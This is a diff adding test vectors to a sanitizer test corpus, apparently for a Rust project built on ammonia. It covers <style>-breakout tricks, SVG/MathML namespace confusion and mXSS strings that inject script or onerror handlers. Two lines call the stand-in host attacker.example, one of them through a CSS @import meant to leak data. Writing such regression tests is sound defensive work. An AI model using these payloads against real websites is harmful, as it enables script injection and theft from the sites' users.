@@ -11,6 +11,9 @@
 >>> note: javascript:/vbscript:/data: in a navigation attribute. A survivor is a
 >>> note: sanitizer-contract hole (defense-in-depth framing is in the test header).
 >>> note: Inline-style CSS and ARIA-tree vectors are intentionally NOT here.
+>>> note: <style>-BLOCK CSS *content* is likewise out of scope (the sanitizer does not
+>>> note: CSS-parse it). But <style> *breakout* vectors — ones that try to escape the
+>>> note: RAWTEXT element into a live element/handler — ARE included (see awh-style-surface).
 
 >>> source: owasp-xss-filter-evasion
 >>> category: script
@@ -203,3 +206,31 @@
 <img src=x onerror=alert(1)//
 <svg><g/onload=alert(1)></g></svg>
 <div id="><img src=x onerror=alert(1)>">x</div>
+
+>>> source: awh-style-surface
+>>> category: style-surface
+>>> note: Probes the v1.4 <style>-block allowance in make_builder() (STYLESHEET_TAGS +
+>>> note: rm_clean_content_tags). Breakout attempts — RAWTEXT close-tag tricks, SVG/MathML/xmp
+>>> note: namespace confusion — must yield NO live element/handler (no surviving <script>,
+>>> note: on*=, or javascript:/vbscript:/data: in a nav attribute). The @import and
+>>> note: position:fixed vectors survive ONLY as inert CSS text: external egress is closed at
+>>> note: the render CSP, and the fixed overlay is the tracked UI-redress residual, not a sink.
+<style></style><script>alert(1)</script>
+<style>x{}</style><img src=x onerror=alert(1)>
+<style>/*</style>*/<script>alert(1)</script>
+<style><![CDATA[</style><script>alert(1)</script>
+<svg><style>.a{}</style><script>alert(1)</script></svg>
+<math><style></style><script>alert(1)</script></math>
+<xmp></xmp><style></style><script>alert(1)</script>
+<style>@import url("https://attacker.example/leak.css");</style>
+<style>*{position:fixed}</style><a href="https://attacker.example">x</a>
+>>> note: Integration-point variants (foreign-content adversarial sweep). annotation-xml
+>>> note: encoding=text/html makes a nested <style> HTML-RAWTEXT in ammonia's parse — but the
+>>> note: allowlist has zero MathML tags, so the whole scaffold drops; svg <title>/<desc> ARE
+>>> note: HTML integration points we allow, so the attribute-eats-the-</style>-closer mXSS and a
+>>> note: non-RAWTEXT SVG-namespaced <style> are exercised directly. All pass today; they are an
+>>> note: ammonia-upgrade tripwire if is_mathml_tag / check_expected_namespace coverage ever shrinks.
+<math><annotation-xml encoding="text/html"><style></style><img src=x onerror=alert(1)></annotation-xml></math>
+<svg><title><style><a title="</style><img src=x onerror=alert(1)>">q</a></title></svg>
+<svg><style>a{content:'</style><img src=x onerror=alert(1)>'}</style></svg>
+<svg><desc><style>/*</desc>*/</style><script>alert(1)</script></svg>
